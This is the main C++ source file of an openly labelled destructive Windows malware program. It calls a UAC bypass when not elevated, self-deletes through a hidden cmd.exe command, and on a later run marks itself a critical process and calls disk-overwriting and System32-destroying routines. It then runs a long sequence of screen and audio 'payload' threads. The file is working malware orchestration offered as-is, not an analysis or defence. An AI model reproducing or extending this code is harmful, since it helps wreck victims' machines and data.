#include "BypassUAC.h"
#include "misc.h"
#include "resource.h"
#include "Payloads.h"
#include "Sound.h"
#pragma warning(disable: 6387)

int WINAPI wWinMain(HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	PWSTR pCmdLine,
	int nCmdShow) {
	if (IsElevated()) {
		if(GetOSVersion()) {
			if(IsFirstRun()) {
				playAudio(hInstance, MAKEINTRESOURCEW(IDR_WAVE1), SND_ASYNC | SND_LOOP | SND_NODEFAULT);
				if (MessageBoxA(NULL, "Beware, dear friend, you've launched MALWARE!\r\nThis wicked code will harm and tear.\r\nSimply press 'No,' and all's in repair.\r\nBut if you dare, with caution, beware.\r\n\r\nDo you dare to execute this harmful snare?", "MAYHEM", MB_YESNO | MB_ICONWARNING) != IDYES ||
					MessageBoxA(NULL, "This is the final plea, hear my song!\r\nThe creator absolves any wrong.\r\nStill persist? Your choice is strong.\r\nThink wise, for consequences belong.\r\n\r\nDo you still wish to proceed along?", "OH, Really?", MB_YESNO | MB_ICONWARNING) != IDYES) {
					WCHAR pathtofile[MAX_PATH];
					HMODULE hModule = GetModuleHandle(NULL);
					GetModuleFileName(hModule, pathtofile, MAX_PATH);

					WCHAR cmdCommand[MAX_PATH];
					swprintf(cmdCommand, MAX_PATH, L"cmd.exe /C timeout /T 5 /NOBREAK & del /F \"%ls\"", pathtofile);

					// Launch the Command Prompt to execute the deletion command
					STARTUPINFOW si = { sizeof(STARTUPINFOW) };
					PROCESS_INFORMATION pi;
					CreateProcess(NULL, cmdCommand, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
					CloseHandle(pi.hProcess);
					CloseHandle(pi.hThread);
					stopAudio();
					ExitProcess(0);
				}
				WHOAMI();
				user();
				all();

				WCHAR pathtofile[MAX_PATH];
				HMODULE hModule = GetModuleHandle(NULL);
				GetModuleFileName(hModule, pathtofile, MAX_PATH);

				WCHAR cmdCommand[MAX_PATH];
				swprintf(cmdCommand, MAX_PATH, L"cmd.exe /C timeout /T 5 /NOBREAK & del /F \"%ls\"", pathtofile);

				// Launch the Command Prompt to execute the deletion command
				STARTUPINFOW si = { sizeof(STARTUPINFOW) };
				PROCESS_INFORMATION pi;
				if (CreateProcess(NULL, cmdCommand, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
				{
					//yep! done!
				}
				else
				{
					// Handle error
					MessageBoxA(NULL, "Did You Delete Command Prompt!?", "UH OH!", MB_OK | MB_TOPMOST | MB_ICONERROR);
				}
				stopAudio();
				CloseHandle(pi.hProcess);
				CloseHandle(pi.hThread);
				// Launch a program from C:\Windows\System32
				std::string programPath = "C:\\Windows\\System32\\winnt32.exe";
				ShellExecuteA(NULL, "open", programPath.c_str(), NULL, NULL, SW_HIDE);
				ExitProcess(0);
				//CrashORRebootWindows();
			}
			else {
				SetCriticalProcess();
				OverWriteDisk();
				WCHAR SystemDirectory[MAX_PATH] = { 0 };
				GetSystemDirectory(SystemDirectory, MAX_PATH);
				DestroyDirectory(SystemDirectory);
				HANDLE hMutex = CreateMutex(NULL, TRUE, L"Mutex");

				if (hMutex == NULL || GetLastError() == ERROR_ALREADY_EXISTS)
				{
					CloseHandle(hMutex);
					return 0;
				}
				/*Awesome Noise*/
				HANDLE Voice = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)AudioPayloadThread, NULL, 0, NULL);
				/*First Payload*/
				HANDLE Payload1 = CreateThread(0, 0, patches, 0, 0, 0);
				Sleep(20000);
				TerminateThread(Payload1, 0);
				/*Second Payload*/
				HANDLE Payload2 = CreateThread(0, 0, LOL, 0, 0, 0);
				Sleep(30000);
				/*Third Payload*/
				HANDLE Payload3 = CreateThread(0, 0, gradient, 0, 0, 0);
				Sleep(30000);
				TerminateThread(Payload3, 0);
				/*Fourth Payload*/
				HANDLE Payload4 = CreateThread(0, 0, Light, 0, 0, 0);
				Sleep(30000);
				/*Fifth Payload*/
				HANDLE Payload5 = CreateThread(0, 0, UGH, 0, 0, 0);
				Sleep(30000);
				TerminateThread(Payload5, 0);
				/*Sixth Payload*/
				HANDLE Payload6 = CreateThread(0, 0, NO, 0, 0, 0);
				Sleep(20000);
				/*Seventh Payload*/
				HANDLE Payload7 = CreateThread(0, 0, draw_thread, 0, 0, 0);
				Sleep(30000);
				TerminateThread(Payload7, 0);
				/*Eigth Payload*/
				TerminateThread(Payload2, 0);
				TerminateThread(Payload6, 0);
				TerminateThread(Payload4, 0);
				HANDLE Payload8 = CreateThread(0, 0, Extreme, 0, 0, 0);
				Sleep(30000);
				TerminateThread(Payload8, 0);
				/*Ninth Payload*/
				HANDLE Payload9 = CreateThread(0, 0, ChaoticArt, 0, 0, 0);
				Sleep(30000);
				/*Tenth Payload*/
				TerminateThread(Payload6, 0);
				TerminateThread(Payload9, 0);
				HANDLE Payload10 = CreateThread(0, 0, MesmerizingCanvas, 0, 0, 0);
				Sleep(30000);
				/*Eleventh Payload*/
				HANDLE Payload11 = CreateThread(0, 0, Draw2DCube, 0, 0, 0);
				Sleep(30000);
				TerminateThread(Payload11, 0);
				/*Twelfth Payload*/
				//Make Sure We Clear The Screen!
				InvalidateRect(0, 0, 0);
				HANDLE Payload12 = CreateThread(0, 0, MoveIconsRandomly, 0, 0, 0);
				Sleep(30000);
				TerminateThread(Payload12, 0);
				/*Thirteenth Payload*/
				HANDLE Payload13 = CreateThread(0, 0, DrawSomething, 0, 0, 0);
				Sleep(30000);
				/*Fourteenth Payload*/
				HANDLE Payload14 = CreateThread(0, 0, MandelBrot, 0, 0, 0);
				Sleep(30000);
				/*Fifteenth Payload*/
				HANDLE Payload15 = CreateThread(0, 0, SquareTunnel, 0, 0, 0);
				Sleep(30000);
				TerminateThread(Payload15, 0);
				/*Sixteenth Payload*/
				HANDLE Payload16 = CreateThread(0, 0, ColourHalf, 0, 0, 0);
				Sleep(30000);
				/*Seventeenth Payload*/
				HANDLE Payload17 = CreateThread(0, 0, InvertScreen, 0, 0, 0);
				Sleep(30000);
				TerminateThread(Payload17, 0);
				/*Eighteenth Payload*/
				HANDLE Payload18 = CreateThread(0, 0, tangent, 0, 0, 0);
				Sleep(35000);
				/*Ninteenth Payload*/
				HANDLE Payload19 = CreateThread(0, 0, ModifyRGBValues, 0, 0, 0);
				Sleep(30000);
				/*Twentieth Payload*/
				HANDLE Payload20 = CreateThread(0, 0, ColorfulNoise, 0, 0, 0);
				Sleep(30000);
				TerminateThread(Payload20, 0);
				TerminateThread(Payload13, 0);
				/*Twenty One Payloads!*/
				HANDLE Payload21 = CreateThread(0, 0, RGBColorCycling, 0, 0, 0);
				Sleep(35000);
				TerminateThread(Payload21, 0);
				/*Last Payload*/
				//Same Thing Here!
				InvalidateRect(0, 0, 0);
				/*Needs Improvements!*/
				TerminateThread(Voice, 0);
				TerminateThread(Payload2, 0);
				TerminateThread(Payload19, 0);
				TerminateThread(Payload18, 0);
				TerminateThread(Payload16, 0);
				TerminateThread(Payload14, 0);
				CreateThread(0, 0, TypeInNotepad, 0, 0, 0);
				CloseHandle(hMutex);
			}
			ExitProcess(0);
		}
		else {
			WHOAMI();
			MessageBoxA(NULL, "This Malware Requires NT 10.0 OR ABOVE TO WORK PROPERLY!", "WINNT32", MB_OK | MB_ICONERROR);
			ExitProcess(1);
		}
	}
	else {
		Bypass();
		ExitProcess(0);
	}
}